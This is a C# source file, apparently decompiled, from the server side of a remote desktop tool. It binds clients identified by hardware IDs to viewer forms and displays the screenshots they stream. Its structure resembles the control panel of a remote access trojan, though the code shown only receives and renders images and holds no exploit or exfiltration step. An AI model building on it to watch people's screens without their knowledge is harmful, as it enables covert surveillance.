using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerDesktop
{
	public static void Read(Clients client, object[] objects)
	{
		string text = (string)objects[1];
		if (!(text == "Connect"))
		{
			if (!(text == "Screen"))
			{
				return;
			}
			FormDesktop form = (FormDesktop)client.Tag;
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			Bitmap bitmap = Methods.ByteArrayToBitmap((byte[])objects[2]);
			form.FPS++;
			if (form.sw.ElapsedMilliseconds >= 1000)
			{
				form.Text = $"Desktop [{client.Hwid}]  Fps[{form.FPS}] Data[{Methods.BytesToString(((byte[])objects[2]).Length)}] Size[{bitmap.Width}x{bitmap.Height}] Screen[{form.screen.Width}x{form.screen.Height}]";
				form.FPS = 0;
				form.sw = Stopwatch.StartNew();
			}
			form.pictureBox1.Invoke((MethodInvoker)delegate
			{
				form.pictureBox1.Image = bitmap;
			});
			return;
		}
		FormDesktop form2 = (FormDesktop)Application.OpenForms["Desktop:" + (string)objects[2]];
		if (form2 == null)
		{
			client.Disconnect();
			return;
		}
		form2.Invoke((MethodInvoker)delegate
		{
			form2.client = client;
			form2.screen = new Size((int)objects[3], (int)objects[4]);
			form2.Text = "Desktop [" + (string)objects[2] + "]";
			form2.materialSwitch1.Enabled = true;
			form2.materialSwitch2.Enabled = true;
			form2.materialSwitch3.Enabled = true;
			form2.materialSwitch4.Enabled = true;
			form2.numericUpDown2.Enabled = true;
		});
		client.Tag = form2;
		client.Hwid = (string)objects[2];
	}
}
